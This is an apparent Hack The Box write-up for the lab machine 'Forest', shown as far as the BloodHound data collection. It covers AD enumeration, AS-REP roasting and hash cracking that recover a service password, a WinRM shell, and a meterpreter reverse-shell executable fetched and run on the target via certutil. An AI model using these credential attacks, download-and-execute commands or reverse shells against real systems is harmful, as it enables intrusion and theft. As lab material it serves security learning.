src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/forest.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.161 forest.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> forest.htb
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-19 08:19 EDT
+Stats: 0:00:10 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
+Connect Scan Timing: About 55.65% <span class="k">done</span><span class="p">;</span> ETC: 08:19 <span class="o">(</span>0:00:08 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for </span>forest.htb <span class="o">(</span>10.10.10.161<span class="o">)</span>
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 989 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    <span class="nb">bind
+</span>88/tcp   open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2019-10-19 12:27:20Z<span class="o">)</span>
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span class="o">=</span>7.70%I<span class="o">=</span>7%D<span class="o">=</span>10/19%Time<span class="o">=</span>5DAAFF64%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNS
+SF:VersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">dir
+1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version
+SF:</span><span class="se">\x</span><span class="s2">04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,2A,<span class="s2">"</span><span class="se">\0\(</span><span class="s2">m</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">82</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\</span><span class="s2">
+SF:0</span><span class="se">\0\0\x</span><span class="s2">01</span><span class="se">\0\0\x</span><span class="s2">02</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\)\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\0\0\0\0\0\x</span><span class="s2">0c</span><span class="se">\0\n\0\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">bd&lt;</span><span class="se">\.\x</span><span class="s2">1
+SF:b</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">c8</span><span class="sb">`</span><span class="s2">");
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h27m37s, deviation: 4h02m31s, median: 7m36s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST</span><span class="se">\x</span><span class="s2">00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2019-10-19T05:29:41-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-10-19 08:29:43
+|_  start_date: 2019-10-19 06:16:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 285.63 seconds
+</span></pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Seems like an Active Directory Domain Controller. Where do we start ? @.@</p><p>According to the <code class="language-plaintext highlighter-rouge">nmap</code>’s host script results, we see the actual domain name of the box is <code class="language-plaintext highlighter-rouge">htb.local</code> so lets modify <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to include it as well.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+...
+10.10.10.161 forest.htb htb.local
+</pre></table></code></div></div><p>Seeing that there might be a <code class="language-plaintext highlighter-rouge">DNS</code> server running on port 53, lets try to use <code class="language-plaintext highlighter-rouge">dig</code> on it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>dig axfr htb.local @10.10.10.161
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.11.5-P4-5.1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr htb.local @10.10.10.161
+<span class="p">;;</span> global options: +cmd
+<span class="p">;</span> Transfer failed.
+</pre></table></code></div></div><p>Nothing :( <code class="language-plaintext highlighter-rouge">LDAP</code> is running on port <code class="language-plaintext highlighter-rouge">389</code> so lets check that out using <code class="language-plaintext highlighter-rouge">ldapsearch</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-h</span> htb.local <span class="nt">-p</span> 389 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"dc=htb,dc=local"</span> 
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;dc=htb,dc=local&gt; with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># htb.local</span>
+dn: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
+</span>objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>
+...
+</pre></table></code></div></div><p>I’m not sure what to look for but let’s first look at what users we can find? I wasn’t familiar with how <code class="language-plaintext highlighter-rouge">LDAP</code> queries work so I decided to use another tool <a href="https://github.com/ropnop/windapsearch"><code class="language-plaintext highlighter-rouge">windapsearch</code></a> to simplify the job.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>python windapsearch.py <span class="nt">-d</span> htb.local <span class="nt">-U</span>
+<span class="o">[</span>+] No username provided. Will try anonymous bind.
+<span class="o">[</span>+] No DC IP provided. Will try to discover via DNS lookup.
+<span class="o">[</span>+] Using Domain Controller at: 10.10.10.161
+<span class="o">[</span>+] Getting defaultNamingContext from Root DSE
+<span class="o">[</span>+]	Found: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>
+<span class="o">[</span>+] Attempting <span class="nb">bind</span>
+<span class="o">[</span>+]	...success! Binded as: 
+<span class="o">[</span>+]	 None
+
+<span class="o">[</span>+] Enumerating all AD <span class="nb">users</span>
+<span class="o">[</span>+]	Found 28 <span class="nb">users</span>: 
+
+...
+
+cn: Sebastien Caron
+userPrincipalName: sebastien@htb.local
+
+cn: Lucinda Berger
+userPrincipalName: lucinda@htb.local
+
+cn: Andy Hislip
+userPrincipalName: andy@htb.local
+
+cn: Mark Brandt
+userPrincipalName: mark@htb.local
+
+cn: Santi Rodriguez
+userPrincipalName: santi@htb.local
+
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bye!
+</pre></table></code></div></div><p>Nice! We found 5 usernames to play with! But what exactly can we do with them?</p><p>Seeing that there is <code class="language-plaintext highlighter-rouge">Kerberos</code> running on port <code class="language-plaintext highlighter-rouge">88</code>, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">article</a>, lets see if we can perform the <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack using <code class="language-plaintext highlighter-rouge">impacket</code>’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"><code class="language-plaintext highlighter-rouge">GetNPUsers.py</code></a> while specifying the 5 usernames we found.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>users.txt
+sebastien
+lucinda
+andy
+mark
+santi
+
+<span class="nv">$ </span>GetNPUsers.py htb.local/ <span class="nt">-usersfile</span> users.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.asreproast
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span>-] User sebastien doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User lucinda doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User mark doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></pre></table></code></div></div><p>Looks like we didn’t manage to get any hashes…</p><p>At this point, I wasn’t sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 6? How was I missing a username?</p><p>Inside of <code class="language-plaintext highlighter-rouge">impacket</code>’s collection of scripts, there was a file called <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py"><code class="language-plaintext highlighter-rouge">GetADUsers.py</code></a> which seemed hopeful.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>GetADUsers.py <span class="nt">-all</span> htb.local/
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Querying htb.local <span class="k">for </span>information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+<span class="nt">--------------------</span>  <span class="nt">------------------------------</span>  <span class="nt">-------------------</span>  <span class="nt">-------------------</span>
+Administrator         Administrator@htb.local         2019-09-18 13:09:08.342879  2019-10-07 06:57:07.299606 
+Guest                                                 &lt;never&gt;                     &lt;never&gt;             
+DefaultAccount                                        &lt;never&gt;                     &lt;never&gt;             
+krbtgt                                                2019-09-18 06:53:23.467452  &lt;never&gt;             
+<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span>                                  &lt;never&gt;                     &lt;never&gt;             
+...          
+sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
+lucinda                                               2019-09-19 20:44:13.233891  &lt;never&gt;             
+svc-alfresco                                          2019-11-16 07:54:12.200875  2019-11-16 07:52:19.754834 
+andy                                                  2019-09-22 18:44:16.291082  &lt;never&gt;             
+mark                                                  2019-09-20 18:57:30.243568  &lt;never&gt;             
+santi                                                 2019-09-20 19:02:55.134828  &lt;never&gt; 
+</pre></table></code></div></div><p>There it is! The 6th username is <code class="language-plaintext highlighter-rouge">svc-alfresco</code>. But I wonder why did the username not appear in our <code class="language-plaintext highlighter-rouge">LDAP</code> search results just now?</p><p>After appending the username to the list of usernames, we performed the <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>GetNPUsers.py htb.local/ <span class="nt">-usersfile</span> users.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.asreproast
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span>-] User sebastien doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User lucinda doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User mark doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+
+$ cat hashes.asreproast
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229
+</span></pre></table></code></div></div><p>Great! We are back on track! We then cracked the hash using <code class="language-plaintext highlighter-rouge">john</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hashes.asreproast 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+s3rvice          <span class="o">(</span><span class="nv">$krb5asrep$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL<span class="o">)</span>
+1g 0:00:00:06 DONE <span class="o">(</span>2019-10-26 03:10<span class="o">)</span> 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</pre></table></code></div></div><p>With <code class="language-plaintext highlighter-rouge">svc-alfresco:s3rvice</code>, I tried enumerating for <code class="language-plaintext highlighter-rouge">SMB</code> shares using <code class="language-plaintext highlighter-rouge">smbmap</code> but found nothing :(</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> htb.local <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice
+<span class="o">[</span>+] Finding open SMB ports....
+<span class="o">[</span>+] User SMB session establishd on htb.local...
+<span class="o">[</span>+] IP: htb.local:445	Name: htb.local                                         
+	Disk                                                  	Permissions
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS
+	C<span class="nv">$ </span>                                               	NO ACCESS
+	IPC<span class="nv">$ </span>                                             	READ ONLY
+	NETLOGON                                          	READ ONLY
+	SYSVOL                                            	READ ONLY
+</pre></table></code></div></div><p>With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-p</span> 1-65535 htb.local
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-16 08:40 EST
+Nmap scan report <span class="k">for </span>htb.local <span class="o">(</span>10.10.10.161<span class="o">)</span>
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65511 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49698/tcp open  unknown
+49708/tcp open  unknown
+</pre></table></code></div></div><p>I now see a possible entry point, which is port <code class="language-plaintext highlighter-rouge">5985</code> that is used by the <code class="language-plaintext highlighter-rouge">WinRM</code> service for remote management of Windows systems. Lets see if we can establish a shell using <code class="language-plaintext highlighter-rouge">Alamot</code>’s <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb"><code class="language-plaintext highlighter-rouge">winrm_shell.rb</code></a></p><div class="language-ruby highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'winrm'</span>
+
+<span class="c1"># Author: Alamot</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> 
+  <span class="ss">endpoint: </span><span class="s1">'http://htb.local:5985/wsman'</span><span class="p">,</span>
+  <span class="ss">transport: :ssl</span><span class="p">,</span>
+  <span class="ss">user: </span><span class="s1">'htb.local\svc-alfresco'</span><span class="p">,</span>
+  <span class="ss">password: </span><span class="s1">'s3rvice'</span><span class="p">,</span>
+  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
+<span class="p">)</span>
+<span class="o">...</span>
+</pre></table></code></div></div><h1 id="usertxt">user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ruby winrm_shell.rb
+PS htb<span class="se">\s</span>vc-alfresco@FOREST Documents&gt; <span class="nb">whoami
+</span>htb<span class="se">\s</span>vc-alfresco
+</pre></table></code></div></div><p>We finally got in! Now, to grab the user flag.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/Desktop</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">htb\svc-alfresco</span><span class="err">@</span><span class="nx">FOREST</span><span class="w"> </span><span class="nx">Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="n">e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span class="w">
+</span></pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>This was where I really got lost and I had to turn to the forums for more hints.</p><p>Many mentioned about some “dog” but I guess they were referring to <a href="https://github.com/BloodHoundAD/BloodHound"><code class="language-plaintext highlighter-rouge">BloodHound</code></a>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor.
+
+BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
+</pre></table></code></div></div><p>When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor (<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe"><code class="language-plaintext highlighter-rouge">SharpHound</code></a>) to run on the system, I first need to upgrade my current <code class="language-plaintext highlighter-rouge">WinRM</code> shell to a <code class="language-plaintext highlighter-rouge">meterpreter</code> shell.</p><p>First, I generate my reverse shell executable using <code class="language-plaintext highlighter-rouge">msfvenom</code> and start our reverse shell listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.XX.XX <span class="nv">LPORT</span><span class="o">=</span>1337 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
+
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+
+<span class="nv">$ </span>msfconsole
+msf5 <span class="o">&gt;</span> use exploit/multi/handler
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.XX.XX
+LHOST <span class="o">=&gt;</span> 10.10.XX.XX
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 1337
+LPORT <span class="o">=&gt;</span> 1337
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XX.XX:1337
+</pre></table></code></div></div><p>And then start a web server using the builtin <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module in <code class="language-plaintext highlighter-rouge">python</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
+<span class="nv">$ </span><span class="nb">cd </span>httpserver
+<span class="nv">$ </span><span class="nb">cp</span> ~/shell.exe <span class="nb">.</span>
+<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+</pre></table></code></div></div><p>In our previous <code class="language-plaintext highlighter-rouge">WinRM</code> shell still hopefully connected,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>PS htb\svc-alfresco@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+
+PS htb\svc-alfresco@FOREST Documents&gt;./shell.exe
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>[*] Sending stage (179779 bytes) to 10.10.10.161
+[*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500
+
+meterpreter &gt;
+</pre></table></code></div></div><p>Next up, we upload <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> to the box and run it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>meterpreter &gt; upload SharpHound.ps1 .
+[*] uploading  : SharpHound.ps1 -&gt; .
+[*] uploaded   : SharpHound.ps1 -&gt; .\SharpHound.ps1
+meterpeter &gt; shell
+Process 2476 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-alfresco\Documents&gt; powershell
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\SharpHound.ps1
+Import-Module .\SharpHound.ps1
+PS C:\Users\svc-alfresco\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
+Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
+Initializing BloodHound at 8:42 AM on 11/16/2019
+Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
+Starting Enumeration for htb.local
+Status: 124 objects enumerated (+124 41.33333/s --- Using 70 MB RAM )
+Finished enumeration for htb.local in 00:00:03.7645465
+1 hosts failed ping. 0 hosts timedout.
+
+Compressing data to C:\Users\svc-alfresco\Documents\20191116084214_BloodHound.zip.
+You can upload this file directly to the UI.
+Finished compressing files!
